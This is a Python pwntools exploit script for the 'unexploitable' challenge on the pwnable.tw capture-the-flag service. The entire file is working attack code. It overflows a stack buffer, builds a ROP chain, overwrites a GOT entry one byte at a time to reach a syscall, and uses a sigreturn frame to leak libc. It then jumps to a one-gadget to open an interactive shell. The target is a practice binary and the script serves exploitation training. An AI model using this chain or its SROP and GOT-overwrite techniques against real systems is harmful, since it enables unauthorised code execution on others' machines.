#!/usr/bin/env python
from pwn import *

addr = "chall.pwnable.tw"
port = 10403
binary = "./unexploitable"

elf = ELF(binary)
bss = elf.bss()
read_plt = elf.plt['read']
read_got = elf.got['read']

sleep_plt = elf.plt['sleep']
sleep_got = elf.got['sleep']

libc = ELF("./libc_64.so.6")
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

poprbpret = 0x0400512 # pop rbp ; ret
addrspret = 0x0400604 # add rsp, 0x38 ; ret
read_gadget = 0x040055B
s = remote(addr, port)

sleep(3)

stage1 = "A"*16 #buf
stage1 += "B"*8 #sfp
stage1 += p64(poprbpret)
stage1 += p64(sleep_got+0x10+0x10+0x8)
stage1 += p64(read_gadget)
s.send(stage1)

stage1 = p64(poprbpret)
stage1 += p64(0x601030+0x10+0x18)
stage1 += p64(read_gadget)
stage1 += p64(poprbpret)
stage1 += p64(sleep_got+0x10)
stage1 += p64(read_gadget)
sleep(0.3)
s.send(stage1)

sleep(0.3)
s.send("\x55") # syscall

stage2 = p64(addrspret) #stage6 ret
stage2 += p64(0x0)
stage2 += p64(0x0)
stage2 += p64(poprbpret) #stage5 ret
stage2 += p64(0x6010b8+0x10)
stage2 += p64(read_gadget)
stage2 += "A"*8
stage2 += "A"*8
stage2 += p64(sleep_plt) #sigreturn
stage2 += p64(0x0) * 5 #ucontext
sleep(0.3)
s.send(stage2)

stage2 = p64(0x0) #r8
stage2 += p64(0x0) #r9
stage2 += p64(0x0) #r10
stage2 += p64(poprbpret) #r11
stage2 += p64(0x601030+0x10) #r12
stage2 += p64(read_gadget) #r13
stage2 += p64(0x0) #R14
stage2 += p64(0x0) #R15
stage2 += p64(0x1) #RDI
stage2 += p64(read_got) #RSI
stage2 += p64(0x601018+0x10) #RBP 0x601110
stage2 += p64(0x0) #RBX
stage2 += p64(0x8) #RDX
stage2 += p64(0x1) #RAX
stage2 += p64(0x0) #RCX
stage2 += p64(0x601168) #RSP
stage2 += p64(sleep_plt) #RIP
stage2 += p64(0x0) #EFLAGS
stage2 += p64(0x33) #CS 0x601148
stage2 += p64(0x0) #GS
stage2 += p64(0x0) #FS
stage2 += p64(0x2b) #SS
stage2 += p64(read_gadget) #0x601160
sleep(0.3)
s.send(stage2)

sleep(0.3)
s.send("A"*0xf)

sleep(0.3)
read_libc = u64(s.recv(8))
libc_base = read_libc - read_offset
one_shot = libc_base + 0xef6c4

log.info("libc_base : %x" % libc_base)
log.info("one_shot : %x" % one_shot)

stage3 = p64(0x0)
stage3 += p64(0x0)
stage3 += p64(0x0)
stage3 += p64(one_shot)
sleep(0.3)
s.send(stage3)

s.interactive()
s.close()
